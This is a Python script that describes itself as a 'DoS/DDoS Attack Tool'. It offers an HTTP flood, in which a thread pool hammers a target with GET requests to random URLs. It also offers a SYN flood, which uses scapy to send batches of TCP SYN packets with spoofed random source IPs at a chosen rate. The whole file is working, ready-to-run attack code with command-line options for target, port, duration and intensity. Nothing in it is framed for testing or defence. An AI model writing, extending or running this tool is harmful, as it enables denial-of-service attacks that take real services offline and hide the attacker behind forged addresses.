import socket
import threading
import time
import argparse
from scapy.all import IP, TCP, send
import random
from queue import Queue

# --- Improved HTTPFlood Class ---
class HTTPFlood:
    def __init__(self, target, port, urls_file, duration, intensity):
        self.target = target
        self.port = port
        self.urls = self._read_urls(urls_file)
        self.duration = duration
        self.intensity = intensity
        self.q = Queue()
        self.running = True

    def _read_urls(self, filename):
        if not filename:
            print("Error: URL file not specified. Using base URL '/'.")
            return ['/']
        try:
            with open(filename, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
                return urls if urls else ['/']
        except FileNotFoundError:
            print(f"File {filename} not found. Using base URL '/'.")
            return ['/']

    def _send_request(self):
        """Worker function for thread. Continuously takes URLs from the queue and sends requests."""
        while self.running:
            try:
                # Get a task from the queue. If the queue is empty, the thread waits.
                url = self.q.get()
                http_request = f"GET {url} HTTP/1.1\r\nHost: {self.target}\r\nConnection: keep-alive\r\n\r\n"
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(5)
                    s.connect((self.target, self.port))
                    s.send(http_request.encode())
                self.q.task_done() # Notify the queue that the task is complete
            except Exception:
                # In case of an error, simply continue so the thread doesn't die
                pass

    def start_attack(self):
        if not self.urls:
            print("URL list is empty. Attack cannot be started.")
            return

        print("Starting HTTP flood attack using a thread pool...")
        
        # Create and start a fixed number of worker threads
        for _ in range(self.intensity):
            thread = threading.Thread(target=self._send_request, daemon=True)
            thread.start()

        start_time = time.time()
        while time.time() - start_time < self.duration:
            # Continuously fill the task queue with tasks (random URLs)
            random_url = random.choice(self.urls)
            self.q.put(random_url)
            # Small pause to avoid instantly overwhelming the queue
            time.sleep(0.001)

        # Signal threads to stop working
        self.running = False
        print("HTTP flood attack completed.")

# --- Improved SynFlood Class ---
class SynFlood:
    def __init__(self, target, port, duration, pps):
        self.target = target
        self.port = port
        self.duration = duration
        self.pps = pps # packets per second

    def _get_random_ip(self):
        """Generates a random public IP address."""
        # Exclude reserved ranges for greater realism
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def start_attack(self):
        print("Starting SYN flood attack...")
        start_time = time.time()
        
        # Send packets in batches for greater efficiency
        while time.time() - start_time < self.duration:
            packets = []
            # Generate a batch of packets to send at once
            for _ in range(self.pps // 10): # Send 1/10 second worth of packets at a time
                src_ip = self._get_random_ip()
                packet = IP(src=src_ip, dst=self.target) / TCP(sport=random.randint(1024, 65535), dport=self.port, flags="S")
                packets.append(packet)
            
            send(packets, verbose=0)
            print(f"Sent a batch of {len(packets)} SYN packets.")
            time.sleep(0.1) # Pause for 0.1 seconds
            
        print("SYN flood attack completed.")


def main():
    parser = argparse.ArgumentParser(description='DoS/DDoS Attack Tool')
    parser.add_argument('attack_type', choices=['http', 'syn'], help='Attack type (http or syn)')
    parser.add_argument('-t', '--target', required=True, help='Target: IP or domain')
    parser.add_argument('-p', '--port', type=int, required=True, help='Target port')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds')
    parser.add_argument('-i', '--intensity', type=int, default=100, help='Intensity: for http - number of threads, for syn - packets/sec')
    parser.add_argument('-u', '--urls', type=str, help='File with URLs for HTTP flood')
    args = parser.parse_args()

    if args.attack_type == 'http':
        http_flood = HTTPFlood(args.target, args.port, args.urls, args.duration, args.intensity)
        http_flood.start_attack()
    elif args.attack_type == 'syn':
        syn_flood = SynFlood(args.target, args.port, args.duration, args.intensity)
        syn_flood.start_attack()

if __name__ == "__main__":
    main()

